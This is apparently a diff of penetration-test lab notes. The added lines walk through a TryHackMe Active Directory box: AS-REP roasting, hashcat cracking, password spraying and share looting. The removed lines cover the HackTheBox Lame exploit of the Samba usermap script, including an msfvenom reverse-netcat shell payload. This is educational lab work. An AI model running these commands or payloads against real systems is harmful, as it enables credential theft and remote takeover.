@@ -249,391 +249,303 @@ THM{ab53e05c9a98def00314a14ccbfa8104}
 
 ```
 
+![[Pasted image 20220711213650.png]]
 
+###### usernames
 
-### SMB enumeration with smbmap
+daven port
+imogen royce
+tamara vidal
+arthur edwards
+carl ingram
+nolan cassidy
+reza zaydan
+ljudmila vetrova
+rico delgado
+tyson williams
+steven bradley
+chamber lin
 
-There is a ```SMB``` port open in ```445```, so lets enumerate for ```open shares``` in SMB
+###### Converting usernames into ad username format
+
+dport
+iroyce
+tvidal
+aedwards
+cingram
+ncassidy
+rzaydan
+lvetrova
+rdelgado
+twilliams
+sbradley
+clin
+
+#### Request AS_REP message
+
+Trying TGT with help of converted usernames..
 
 ```c
- ┌──(aidenpearce369㉿aidenpearce369)-[~]
-└─$ smbmap -H 10.10.10.3
-[+] IP: 10.10.10.3:445  Name: 10.10.10.3                                     
+root@rE3oN:~/thm/machines/medium/raz0rblack# python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py -no-pass raz0rblack.thm/ -usersfile usernames_mod.txt -format hashcat -outputfile asreproast_hash.txt -dc-ip 10.10.135.22
+Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
+
+[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
+[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
+[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
+[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
+[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
+[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
+[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
+[-] User lvetrova doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
+[-] User sbradley doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
+```
+
+Got the hash of ```twilliams``` 
+
+```c
+root@rE3oN:~/thm/machines/medium/raz0rblack# cat asreproast_hash.txt
+$krb5asrep$23$twilliams@RAZ0RBLACK.THM:3bb43a9f0291f39fa6030cd00f369fd4$06f6dc8b123f84a99702119a55cf74b9ba8471a0825a6302fc25f593b881b2f21207001aed24fa66b44e8b85b264b955f09366e3c749018cdf6bea9882a4887d82ecd855cf92ae1593c5f45904490efb2d8ced37eed632c2c196b499980684c096db1f76a1fb6e556a79a16e98d202ffbf794936e5182567989ce7f34e765a2bf37ef6852203411904a0e37a557a6a21f7a8e42043777ca4e030a97327fc686a7c9f2896f1c5251dbad6c568673224cbf494c94c392e275d1360920352ca6b183a948e178f6945418aa8726005efd94c675c0c3268fda371088ac3dea2c54e3b7bb0788831d62bf08c3a12e0b1900bcd
+```
+
+#### Cracking the hash
+
+
+```c
+root@rE3oN:~/thm/machines/medium/raz0rblack# hashcat -m 18200 asreproast_hash.txt /usr/share/wordlists/rockyou.txt | tee kerberoast-password.txt
+hashcat (v6.2.5) starting
+
+OpenCL API (OpenCL 3.0 PoCL 3.0+debian  Linux, None+Asserts, RELOC, LLVM 13.0.1, SLEEF, POCL_DEBUG) - Platform #1 [The pocl project]
+====================================================================================================================================
+* Device #1: pthread-0x000, 1439/2942 MB (512 MB allocatable), 4MCU
+
+Minimum password length supported by kernel: 0
+Maximum password length supported by kernel: 256
+
+Hashes: 1 digests; 1 unique digests, 1 unique salts
+Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
+Rules: 1
+
+Optimizers applied:
+* Zero-Byte
+* Not-Iterated
+* Single-Hash
+* Single-Salt
+
+ATTENTION! Pure (unoptimized) backend kernels selected.
+Pure kernels can crack longer passwords, but drastically reduce performance.
+If you want to switch to optimized kernels, append -O to your commandline.
+See the above message to find out about the exact limits.
+
+Watchdog: Hardware monitoring interface not found on your system.
+Watchdog: Temperature abort trigger disabled.
+
+Host memory required for this attack: 0 MB
+
+Dictionary cache hit:
+* Filename..: /usr/share/wordlists/rockyou.txt
+* Passwords.: 14344385
+* Bytes.....: 139921507
+* Keyspace..: 14344385
+
+$krb5asrep$23$twilliams@RAZ0RBLACK.THM:3bb43a9f0291f39fa6030cd00f369fd4$06f6dc8b123f84a99702119a55cf74b9ba8471a0825a6302fc25f593b881b2f21207001aed24fa66b44e8b85b264b955f09366e3c749018cdf6bea9882a4887d82ecd855cf92ae1593c5f45904490efb2d8ced37eed632c2c196b499980684c096db1f76a1fb6e556a79a16e98d202ffbf794936e5182567989ce7f34e765a2bf37ef6852203411904a0e37a557a6a21f7a8e42043777ca4e030a97327fc686a7c9f2896f1c5251dbad6c568673224cbf494c94c392e275d1360920352ca6b183a948e178f6945418aa8726005efd94c675c0c3268fda371088ac3dea2c54e3b7bb0788831d62bf08c3a12e0b1900bcd:roastpotatoes
+
+Session..........: hashcat
+Status...........: Cracked
+Hash.Mode........: 18200 (Kerberos 5, etype 23, AS-REP)
+Hash.Target......: $krb5asrep$23$twilliams@RAZ0RBLACK.THM:3bb43a9f0291...900bcd
+Time.Started.....: Mon Jul 11 21:59:30 2022 (2 secs)
+Time.Estimated...: Mon Jul 11 21:59:32 2022 (0 secs)
+Kernel.Feature...: Pure Kernel
+Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
+Guess.Queue......: 1/1 (100.00%)
+Speed.#1.........:  1784.0 kH/s (0.43ms) @ Accel:256 Loops:1 Thr:1 Vec:4
+Recovered........: 1/1 (100.00%) Digests
+Progress.........: 4221952/14344385 (29.43%)
+Rejected.........: 0/4221952 (0.00%)
+Restore.Point....: 4220928/14344385 (29.43%)
+Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
+Candidate.Engine.: Device Generator
+Candidates.#1....: robb-lfc -> roastmutton
+
+Started: Mon Jul 11 21:59:29 2022
+Stopped: Mon Jul 11 21:59:34 2022
+
+```
+
+
+```c
+root@rE3oN:~/thm/machines/medium/raz0rblack# smbmap -H 10.10.40.138 -u twilliams -p roastpotatoes
+[+] IP: 10.10.40.138:445        Name: 10.10.40.138
         Disk                                                    Permissions     Comment
         ----                                                    -----------     -------
-        print$                                                  NO ACCESS       Printer Drivers
-        tmp                                                     READ, WRITE     oh noes!
-        opt                                                     NO ACCESS
-        IPC$                                                    NO ACCESS       IPC Service (lame server (Samba 3.0.20-Debian))
-        ADMIN$                                                  NO ACCESS       IPC Service (lame server (Samba 3.0.20-Debian))
+        ADMIN$                                                  NO ACCESS       Remote Admin
+        C$                                                      NO ACCESS       Default share
+        IPC$                                                    READ ONLY       Remote IPC
+        NETLOGON                                                READ ONLY       Logon server share
+        SYSVOL                                                  READ ONLY       Logon server share
+        trash                                                   NO ACCESS       Files Pending for deletion
+
 ```
-
-There is a share named ```tmp``` where we can ```read & write```
-
-
-
-### SMB enumeration with smbclient
-
-We got an open share named ```tmp```, lets try to enumerate this share with ```smbclient```
 
 ```c
-┌──(aidenpearce369㉿aidenpearce369)-[~]
-└─$ smbclient  -N //10.10.10.3/tmp
-protocol negotiation failed: NT_STATUS_CONNECTION_DISCONNECTED
+root@rE3oN:~/thm/machines/medium/raz0rblack# crackmapexec smb 10.10.40.138 -u usernames_mod.txt -p roastpotatoes  --continue-on-success
+SMB         10.10.40.138    445    HAVEN-DC         [*] Windows 10.0 Build 17763 x64 (name:HAVEN-DC) (domain:raz0rblack.thm) (signing:True) (SMBv1:False)
+SMB         10.10.40.138    445    HAVEN-DC         [-] raz0rblack.thm\dport:roastpotatoes STATUS_LOGON_FAILURE
+SMB         10.10.40.138    445    HAVEN-DC         [-] raz0rblack.thm\iroyce:roastpotatoes STATUS_LOGON_FAILURE
+SMB         10.10.40.138    445    HAVEN-DC         [-] raz0rblack.thm\tvidal:roastpotatoes STATUS_LOGON_FAILURE
+SMB         10.10.40.138    445    HAVEN-DC         [-] raz0rblack.thm\aedwards:roastpotatoes STATUS_LOGON_FAILURE
+SMB         10.10.40.138    445    HAVEN-DC         [-] raz0rblack.thm\cingram:roastpotatoes STATUS_LOGON_FAILURE
+SMB         10.10.40.138    445    HAVEN-DC         [-] raz0rblack.thm\ncassidy:roastpotatoes STATUS_LOGON_FAILURE
+SMB         10.10.40.138    445    HAVEN-DC         [-] raz0rblack.thm\rzaydan:roastpotatoes STATUS_LOGON_FAILURE
+SMB         10.10.40.138    445    HAVEN-DC         [-] raz0rblack.thm\lvetrova:roastpotatoes STATUS_LOGON_FAILURE
+SMB         10.10.40.138    445    HAVEN-DC         [-] raz0rblack.thm\rdelgado:roastpotatoes STATUS_LOGON_FAILURE
+SMB         10.10.40.138    445    HAVEN-DC         [+] raz0rblack.thm\twilliams:roastpotatoes
+SMB         10.10.40.138    445    HAVEN-DC         [-] raz0rblack.thm\sbradley:roastpotatoes STATUS_PASSWORD_MUST_CHANGE
+SMB         10.10.40.138    445    HAVEN-DC         [-] raz0rblack.thm\clin:roastpotatoes STATUS_LOGON_FAILURE
+
 ```
 
-It shows ```protocol negotiation failed: NT_STATUS_CONNECTION_DISCONNECTED```, which means our ```smbclient``` is not ready to lower its protocol inorder to connect with the machine's SMB share
-
-We have to force our smbclient to lower its protocol to connect with ```Samba v1 (SMB1)```
 
 ```c
-┌──(aidenpearce369㉿aidenpearce369)-[~]
-└─$ smbclient  -N //10.10.10.3/tmp --option="client min protocol = NT1"
-Anonymous login successful
-Try "help" to get a list of possible commands.
-smb: \> ls
-  .                                   D        0  Wed Sep 15 11:04:34 2021
-  ..                                 DR        0  Sat Oct 31 12:03:58 2020
-  .ICE-unix                          DH        0  Wed Sep 15 10:50:26 2021
-  vmware-root                        DR        0  Wed Sep 15 10:50:49 2021
-  .X11-unix                          DH        0  Wed Sep 15 10:50:51 2021
-  .X0-lock                           HR       11  Wed Sep 15 10:50:51 2021
-  5562.jsvc_up                        R        0  Wed Sep 15 10:51:29 2021
-  vgauthsvclog.txt.0                  R     1600  Wed Sep 15 10:50:24 2021
-
-                7282168 blocks of size 1024. 5386528 blocks available
-smb: \> 
+root@rE3oN:~/thm/machines/medium/raz0rblack# smbpasswd -r 10.10.40.138 -U sbradley
+Old SMB password:
+New SMB password:
+Retype new SMB password:
+Password changed for user sbradley on 10.10.40.138.
 ```
-
-There is no useful information from SMB shares
-
-## Finding Suitable Exploits With Searchsploit
-
-After enumerating all protocols, we are empty handed
-
-So its better to find an exploit for the protocols with the specific version number of the service
-
-### FTP - VSFTPD 2.3.4 exploit
 
 ```c
-┌──(aidenpearce369㉿aidenpearce369)-[~]
-└─$ searchsploit vsftpd 2.3.4
----------------------------------------------------------------------------------------------------------------- ---------------------------------
- Exploit Title                                                                                                  |  Path
----------------------------------------------------------------------------------------------------------------- ---------------------------------
-vsftpd 2.3.4 - Backdoor Command Execution                                                                       | unix/remote/49757.py
-vsftpd 2.3.4 - Backdoor Command Execution (Metasploit)                                                          | unix/remote/17491.rb
----------------------------------------------------------------------------------------------------------------- ---------------------------------
-Shellcodes: No Results
+root@rE3oN:~/thm/machines/medium/raz0rblack# smbmap -R $trash -H 10.10.40.138 -u sbradley -p tester123
+[+] IP: 10.10.40.138:445        Name: 10.10.40.138
+        Disk                                                    Permissions     Comment
+        ----                                                    -----------     -------
+        ADMIN$                                                  NO ACCESS       Remote Admin
+        C$                                                      NO ACCESS       Default share
+        IPC$                                                    READ ONLY       Remote IPC
+        .\IPC$\*
+        fr--r--r--                3 Mon Jan  1 05:53:28 1601    InitShutdown
+        fr--r--r--                4 Mon Jan  1 05:53:28 1601    lsass
+        fr--r--r--                3 Mon Jan  1 05:53:28 1601    ntsvcs
+        fr--r--r--                3 Mon Jan  1 05:53:28 1601    scerpc
+        fr--r--r--                1 Mon Jan  1 05:53:28 1601    Winsock2\CatalogChangeListener-3ec-0
+        fr--r--r--                3 Mon Jan  1 05:53:28 1601    epmapper
+        fr--r--r--                1 Mon Jan  1 05:53:28 1601    Winsock2\CatalogChangeListener-2b4-0
+        fr--r--r--                3 Mon Jan  1 05:53:28 1601    LSM_API_service
+        fr--r--r--                3 Mon Jan  1 05:53:28 1601    eventlog
+        fr--r--r--                1 Mon Jan  1 05:53:28 1601    Winsock2\CatalogChangeListener-434-0
+        fr--r--r--                3 Mon Jan  1 05:53:28 1601    atsvc
+        fr--r--r--                3 Mon Jan  1 05:53:28 1601    TermSrv_API_service
+        fr--r--r--                3 Mon Jan  1 05:53:28 1601    Ctx_WinStation_API_service
+        fr--r--r--                4 Mon Jan  1 05:53:28 1601    wkssvc
+        fr--r--r--                1 Mon Jan  1 05:53:28 1601    Winsock2\CatalogChangeListener-314-0
+        fr--r--r--                1 Mon Jan  1 05:53:28 1601    Winsock2\CatalogChangeListener-314-1
+        fr--r--r--                1 Mon Jan  1 05:53:28 1601    Winsock2\CatalogChangeListener-33c-0
+        fr--r--r--                3 Mon Jan  1 05:53:28 1601    SessEnvPublicRpc
+        fr--r--r--                3 Mon Jan  1 05:53:28 1601    RpcProxy\49670
+        fr--r--r--                3 Mon Jan  1 05:53:28 1601    6b2ce3a02cafe066
+        fr--r--r--                3 Mon Jan  1 05:53:28 1601    RpcProxy\593
+        fr--r--r--                1 Mon Jan  1 05:53:28 1601    Winsock2\CatalogChangeListener-680-0
+        fr--r--r--                4 Mon Jan  1 05:53:28 1601    srvsvc
+        fr--r--r--                3 Mon Jan  1 05:53:28 1601    spoolss
+        fr--r--r--                1 Mon Jan  1 05:53:28 1601    Winsock2\CatalogChangeListener-968-0
+        fr--r--r--                3 Mon Jan  1 05:53:28 1601    netdfs
+        fr--r--r--                4 Mon Jan  1 05:53:28 1601    W32TIME_ALT
+        fr--r--r--                1 Mon Jan  1 05:53:28 1601    Winsock2\CatalogChangeListener-300-0
+        fr--r--r--                1 Mon Jan  1 05:53:28 1601    Winsock2\CatalogChangeListener-a68-0
+        fr--r--r--                1 Mon Jan  1 05:53:28 1601    PIPE_EVENTROOT\CIMV2SCM EVENT PROVIDER
+        fr--r--r--                3 Mon Jan  1 05:53:28 1601    Amazon\SSM\InstanceData\health
+        fr--r--r--                3 Mon Jan  1 05:53:28 1601    Amazon\SSM\InstanceData\termination
+        fr--r--r--                1 Mon Jan  1 05:53:28 1601    Winsock2\CatalogChangeListener-a2c-0
+        NETLOGON                                                READ ONLY       Logon server share
+        .\NETLOGON\*
+        dr--r--r--                0 Tue Feb 23 20:30:16 2021    .
+        dr--r--r--                0 Tue Feb 23 20:30:16 2021    ..
+        SYSVOL                                                  READ ONLY       Logon server share
+        .\SYSVOL\*
+        dr--r--r--                0 Tue Feb 23 20:30:16 2021    .
+        dr--r--r--                0 Tue Feb 23 20:30:16 2021    ..
+        dr--r--r--                0 Tue Feb 23 20:30:16 2021    raz0rblack.thm
+        .\SYSVOL\raz0rblack.thm\*
+        dr--r--r--                0 Tue Feb 23 20:33:11 2021    .
+        dr--r--r--                0 Tue Feb 23 20:33:11 2021    ..
+        dr--r--r--                0 Mon Jul 11 22:17:27 2022    DfsrPrivate
+        dr--r--r--                0 Tue Feb 23 20:30:16 2021    Policies
+        dr--r--r--                0 Tue Feb 23 20:30:16 2021    scripts
+        .\SYSVOL\raz0rblack.thm\Policies\*
+        dr--r--r--                0 Tue Feb 23 20:30:16 2021    .
+        dr--r--r--                0 Tue Feb 23 20:30:16 2021    ..
+        dr--r--r--                0 Tue Feb 23 20:30:16 2021    {31B2F340-016D-11D2-945F-00C04FB984F9}
+        dr--r--r--                0 Tue Feb 23 20:30:16 2021    {6AC1786C-016F-11D2-945F-00C04fB984F9}
+        .\SYSVOL\raz0rblack.thm\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\*
+        dr--r--r--                0 Tue Feb 23 20:30:16 2021    .
+        dr--r--r--                0 Tue Feb 23 20:30:16 2021    ..
+        fr--r--r--               23 Tue Feb 23 20:44:46 2021    GPT.INI
+        dr--r--r--                0 Tue Feb 23 20:43:53 2021    MACHINE
+        dr--r--r--                0 Tue Feb 23 20:30:16 2021    USER
+        .\SYSVOL\raz0rblack.thm\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\*
+        dr--r--r--                0 Tue Feb 23 20:43:53 2021    .
+        dr--r--r--                0 Tue Feb 23 20:43:53 2021    ..
+        dr--r--r--                0 Tue Feb 23 20:30:16 2021    Microsoft
+        fr--r--r--             2796 Tue Feb 23 20:36:52 2021    Registry.pol
+        dr--r--r--                0 Tue Feb 23 20:43:53 2021    Scripts
+        .\SYSVOL\raz0rblack.thm\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Microsoft\*
+        dr--r--r--                0 Tue Feb 23 20:30:16 2021    .
+        dr--r--r--                0 Tue Feb 23 20:30:16 2021    ..
+        dr--r--r--                0 Tue Feb 23 20:30:16 2021    Windows NT
+        .\SYSVOL\raz0rblack.thm\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Scripts\*
+        dr--r--r--                0 Tue Feb 23 20:43:53 2021    .
+        dr--r--r--                0 Tue Feb 23 20:43:53 2021    ..
+        dr--r--r--                0 Tue Feb 23 20:43:53 2021    Shutdown
+        dr--r--r--                0 Tue Feb 23 20:43:53 2021    Startup
+        .\SYSVOL\raz0rblack.thm\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\*
+        dr--r--r--                0 Tue Feb 23 20:30:16 2021    .
+        dr--r--r--                0 Tue Feb 23 20:30:16 2021    ..
+        fr--r--r--               22 Tue Feb 23 20:30:16 2021    GPT.INI
+        dr--r--r--                0 Tue Feb 23 20:30:16 2021    MACHINE
+        dr--r--r--                0 Tue Feb 23 20:30:16 2021    USER
+        .\SYSVOL\raz0rblack.thm\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\MACHINE\*
+        dr--r--r--                0 Tue Feb 23 20:30:16 2021    .
+        dr--r--r--                0 Tue Feb 23 20:30:16 2021    ..
+        dr--r--r--                0 Tue Feb 23 20:30:16 2021    Microsoft
+        .\SYSVOL\raz0rblack.thm\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\MACHINE\Microsoft\*
+        dr--r--r--                0 Tue Feb 23 20:30:16 2021    .
+        dr--r--r--                0 Tue Feb 23 20:30:16 2021    ..
+        dr--r--r--                0 Tue Feb 23 20:30:16 2021    Windows NT
+        trash                                                   READ ONLY       Files Pending for deletion
+        .\trash\*
+        dr--r--r--                0 Tue Mar 16 11:31:28 2021    .
+        dr--r--r--                0 Tue Mar 16 11:31:28 2021    ..
+        fr--r--r--             1340 Fri Feb 26 00:59:05 2021    chat_log_20210222143423.txt
+        fr--r--r--         18927164 Tue Mar 16 11:32:20 2021    experiment_gone_wrong.zip
+        fr--r--r--               37 Sun Feb 28 00:54:21 2021    sbradley.txt
+
+root@rE3oN:~/thm/machines/medium/raz0rblack# smbmap -R $trash -H 10.10.40.138 -u sbradley -p tester123 --download '.\trash\chat_log_20210222143423.txt'
+[+] Starting download: trash\chat_log_20210222143423.txt (1340 bytes)
+[+] File output to: /root/thm/machines/medium/raz0rblack/10.10.40.138-trash_chat_log_20210222143423.txt
+
+root@rE3oN:~/thm/machines/medium/raz0rblack# ls
+10.10.40.138-trash_chat_log_20210222143423.txt  ferox-http_10_10_247_120:47001_-1657378037.state  kerberoast-password.txt  usernames_mod.txt
+asreproast_hash.txt                             ferox-http_10_10_247_120:5985_-1657378037.state   results                  usernames.txt
+
+root@rE3oN:~/thm/machines/medium/raz0rblack# cat 10.10.40.138-trash_chat_log_20210222143423.txt
+sbradley> Hey Administrator our machine has the newly disclosed vulnerability for Windows Server 2019.
+Administrator> What vulnerability??
+sbradley> That new CVE-2020-1472 which is called ZeroLogon has released a new PoC.
+Administrator> I have given you the last warning. If you exploit this on this Domain Controller as you did previously on our old Ubuntu server with dirtycow, I swear I will kill your WinRM-Access.
+sbradley> Hey you won't believe what I am seeing.
+Administrator> Now, don't say that you ran the exploit.
+sbradley> Yeah, The exploit works great it needs nothing like credentials. Just give it IP and domain name and it resets the Administrator pass to an empty hash.
+sbradley> I also used some tools to extract ntds. dit and SYSTEM.hive and transferred it into my box. I love running secretsdump.py on those files and dumped the hash.
+Administrator> I am feeling like a new cron has been issued in my body named heart attack which will be executed within the next minute.
+Administrator> But, Before I die I will kill your WinRM access..........
+sbradley> I have made an encrypted zip containing the ntds.dit and the SYSTEM.hive and uploaded the zip inside the trash share.
+sbradley> Hey Administrator are you there ...
+sbradley> Administrator .....
+
+The administrator died after this incident.
+
+Press F to pay respects
+
 ```
-
-So there is a possible backdoor command execution in FTP protocol
-
-It is also a popular exploit when it comes to ```FTP Exploitation```
-
-### Samba 3.0.20 exploit
-
-```c
-┌──(aidenpearce369㉿aidenpearce369)-[~]
-└─$ searchsploit samba | grep 3.0.20
-Samba 3.0.20 < 3.0.25rc3 - 'Username' map script' Command Execution (Metasploit)                                | unix/remote/16320.rb
-Samba < 3.0.20 - Remote Heap Overflow                                                                           | linux/remote/7701.txt
-```
-
-Here we have 2 possible exploits, but we don't want to overflow the SMB
-
-We need a RCE, so we go for ```'Username' map script' Command Execution``` to exploit this version of SMB
-
-## Gaining Access
-
-### VSFTPD 2.3.4 manual exploit
-
-This is a simple exploit that is being triggered with ```:)``` (Not smiley)
-
-For more reference on this [exploit](https://www.exploit-db.com/exploits/49757)
-
-Manual exploit [python script](https://github.com/ahervias77/vsftpd-2.3.4-exploit/blob/master/vsftpd_234_exploit.py)
-
-Trying manually without scripts,
-
-```c
-┌──(aidenpearce369㉿aidenpearce369)-[~/HTB/Lame]
-└─$ nc 10.10.10.3 21
-220 (vsFTPd 2.3.4)
-USER monish:)
-331 Please specify the password.
-PASS hackme
-500 OOPS: priv_sock_get_result
-
-┌──(aidenpearce369㉿aidenpearce369)-[~]
-└─$ nc 10.10.10.3 6200                                             
-(UNKNOWN) [10.10.10.3] 6200 (?) : Connection timed out
-```
-
-No luck
-
-Trying with scripts,
-
-```c
-┌──(aidenpearce369㉿aidenpearce369)-[~/HTB/Lame]
-└─$ python3 vsftpd.py                                              
-Usage: ./vsftpd_234_exploit.py <IP address> <port> <command>
-Example: ./vsftpd_234_exploit.py 192.168.1.10 21 whoami
-                                                                      
-┌──(aidenpearce369㉿aidenpearce369)-[~/HTB/Lame]
-└─$ python3 vsftpd.py 10.10.10.3 21 whoami
-[*] Attempting to trigger backdoor...
-[+] Triggered backdoor
-[*] Attempting to connect to backdoor...
-[!] Failed to connect to backdoor on 10.10.10.3:6200
-
-┌──(aidenpearce369㉿aidenpearce369)-[~]
-└─$ nc 10.10.10.3 6200                                             
-(UNKNOWN) [10.10.10.3] 6200 (?) : Connection timed out
-```
-
-After googling, it is mentioned that this exploit will work damn sure if the version number is correct
-
-But the problem in spawning reverse shell connection is due to ```firewall/iptables``` which doesn't let the outbound connection on port ```6200```
-
-### VSFTPD 2.3.4 metasploit exploit
-
-There is already an exploit for this vulnerability in metasploit, lets try to use this one
-
-```c
-msf6 > search vsftpd2.3.4
-[-] No results from search
-msf6 > search vsftpd 2.3.4
-
-Matching Modules
-================
-
-   #  Name                                  Disclosure Date  Rank       Check  Description
-   -  ----                                  ---------------  ----       -----  -----------
-   0  exploit/unix/ftp/vsftpd_234_backdoor  2011-07-03       excellent  No     VSFTPD v2.3.4 Backdoor Command Execution
-
-
-Interact with a module by name or index. For example info 0, use 0 or use exploit/unix/ftp/vsftpd_234_backdoor
-
-msf6 > use 0
-[*] No payload configured, defaulting to cmd/unix/interact
-msf6 exploit(unix/ftp/vsftpd_234_backdoor) > show options 
-
-Module options (exploit/unix/ftp/vsftpd_234_backdoor):
-
-   Name    Current Setting  Required  Description
-   ----    ---------------  --------  -----------
-   RHOSTS                   yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
-   RPORT   21               yes       The target port (TCP)
-
-
-Payload options (cmd/unix/interact):
-
-   Name  Current Setting  Required  Description
-   ----  ---------------  --------  -----------
-
-
-Exploit target:
-
-   Id  Name
-   --  ----
-   0   Automatic
-
-
-msf6 exploit(unix/ftp/vsftpd_234_backdoor) > set RHOSTS 10.10.10.3
-RHOSTS => 10.10.10.3
-msf6 exploit(unix/ftp/vsftpd_234_backdoor) > run
-
-[*] 10.10.10.3:21 - Banner: 220 (vsFTPd 2.3.4)
-[*] 10.10.10.3:21 - USER: 331 Please specify the password.
-[*] Exploit completed, but no session was created.
-```
-
-Same bad luck, this exploit was completed but it could not get the reverse shell from inside of the machine
-
-### Samba 3.0.20 manual exploit
-
-From the ```'Username' map script' Command Execution``` exploit, we can clearly see that this exploit is being triggered by ```nohup```
-
-The nohup command executes another program specified as its argument and ignores all SIGHUP (hangup) signals. SIGHUP is a signal that is sent to a process when its controlling terminal is closed
-
-This exploit requires ```no authentication``` on SMB and it uses ```username``` to pass payloads via ```nohup``` in it
-
-The exploit section in ```ruby``` will be like ,
-
-```c
-def exploit
-
-		connect
-
-		# lol?
-		username = "/=`nohup " + payload.encoded + "`"
-		begin
-			simple.client.negotiate(false)
-			simple.client.session_setup_ntlmv1(username, rand_text(16), datastore['SMBDomain'], false)
-		rescue ::Timeout::Error, XCEPT::LoginError
-			# nothing, it either worked or it didn't ;)
-		end
-
-		handler
-	end
-```
-
-Searching for a short and sweet exploit, I found [this](https://gist.github.com/joenorton8014/19aaa00e0088738fc429cff2669b9851) 
-
-The manual exploit for Samba 3.0.20 will be like,
-
-```c
-#!/usr/bin/python
-
-from smb.SMBConnection import SMBConnection
-import random, string
-from smb import smb_structs
-smb_structs.SUPPORT_SMB2 = False
-import sys
-
-
-# Just a python version of a very simple Samba exploit. 
-# It doesn't have to be pretty because the shellcode is executed
-# in the username field. 
-
-# Based off this Metasploit module - https://www.exploit-db.com/exploits/16320/ 
-
-# Configured SMB connection options with info from here:
-# https://pythonhosted.org/pysmb/api/smb_SMBConnection.html
-
-# Use the commandline argument as the target: 
-if len(sys.argv) < 2:
-    print "\nUsage: " + sys.argv[0] + " <HOST>\n"
-    sys.exit()
-
-
-# Shellcode: 
-# msfvenom -p cmd/unix/reverse_netcat LHOST=10.0.0.35 LPORT=9999 -f python
-
-buf =  ""
-buf += "FILL PAYLOAD HERE"
-buf += "FILL PAYLOAD HERE"
-buf += "FILL PAYLOAD HERE"
-buf += "FILL PAYLOAD HERE"
-buf += "FILL PAYLOAD HERE"
-buf += "FILL PAYLOAD HERE"
-buf += "FILL PAYLOAD HERE"
-buf += "FILL PAYLOAD HERE"
-
-
-username = "/=`nohup " + buf + "`"
-password = ""
-conn = SMBConnection(username, password, "SOMEBODYHACKINGYOU" , "METASPLOITABLE", use_ntlm_v2 = False)
-assert conn.connect(sys.argv[1], 445)
-```
-
-We have to generate our ```shellcode``` using ```msfvenom``` which will be our payload in the exploit script to trigger a reverse shell
-
-```c
-┌──(aidenpearce369㉿aidenpearce369)-[~]
-└─$ msfvenom -p cmd/unix/reverse_netcat LHOST=10.10.14.8 LPORT=6789 -f python
-[-] No platform was selected, choosing Msf::Module::Platform::Unix from the payload
-[-] No arch selected, selecting arch: cmd from the payload
-No encoder specified, outputting raw payload
-Payload size: 88 bytes
-Final size of python file: 440 bytes
-buf =  b""
-buf += b"\x6d\x6b\x66\x69\x66\x6f\x20\x2f\x74\x6d\x70\x2f\x6c"
-buf += b"\x63\x6f\x69\x3b\x20\x6e\x63\x20\x31\x30\x2e\x31\x30"
-buf += b"\x2e\x31\x34\x2e\x38\x20\x36\x37\x38\x39\x20\x30\x3c"
-buf += b"\x2f\x74\x6d\x70\x2f\x6c\x63\x6f\x69\x20\x7c\x20\x2f"
-buf += b"\x62\x69\x6e\x2f\x73\x68\x20\x3e\x2f\x74\x6d\x70\x2f"
-buf += b"\x6c\x63\x6f\x69\x20\x32\x3e\x26\x31\x3b\x20\x72\x6d"
-buf += b"\x20\x2f\x74\x6d\x70\x2f\x6c\x63\x6f\x69"
-```
-
-Copy this shellcode in the exploit script and start running it with ```netcat``` listener to get the ```reverse shell```
-
-```c
-┌──(aidenpearce369㉿aidenpearce369)-[~/HTB/Lame]
-└─$ python samba.py 10.10.10.3                                                           
-
-┌──(aidenpearce369㉿aidenpearce369)-[~]
-└─$ nc -nlvp 6789                                                  1 ⨯
-listening on [any] 6789 ...
-connect to [10.10.14.8] from (UNKNOWN) [10.10.10.3] 54632
-id
-uid=0(root) gid=0(root)
-whoami
-root
-ls /home/
-ftp
-makis
-service
-user
-cat /home/makis/user.txt
-<---USER FLAG--->
-cat /root/root.txt
-<---ROOT FLAG--->
-```
-
-### Samba 3.0.20 metasploit exploit
-
-Lets use the metasploit exploit for Samba 3.0.20 by simply configuring the remote and listener
-
-```c
-msf6 > search samba 3.0.20
-
-Matching Modules
-================
-
-   #  Name                                Disclosure Date  Rank       Check  Description
-   -  ----                                ---------------  ----       -----  -----------
-   0  exploit/multi/samba/usermap_script  2007-05-14       excellent  No     Samba "username map script" Command Execution
-
-
-Interact with a module by name or index. For example info 0, use 0 or use exploit/multi/samba/usermap_script
-
-msf6 > use 0
-[*] No payload configured, defaulting to cmd/unix/reverse_netcat
-msf6 exploit(multi/samba/usermap_script) > show options 
-
-Module options (exploit/multi/samba/usermap_script):
-
-   Name    Current Setting  Required  Description
-   ----    ---------------  --------  -----------
-   RHOSTS                   yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
-   RPORT   139              yes       The target port (TCP)
-
-
-Payload options (cmd/unix/reverse_netcat):
-
-   Name   Current Setting  Required  Description
-   ----   ---------------  --------  -----------
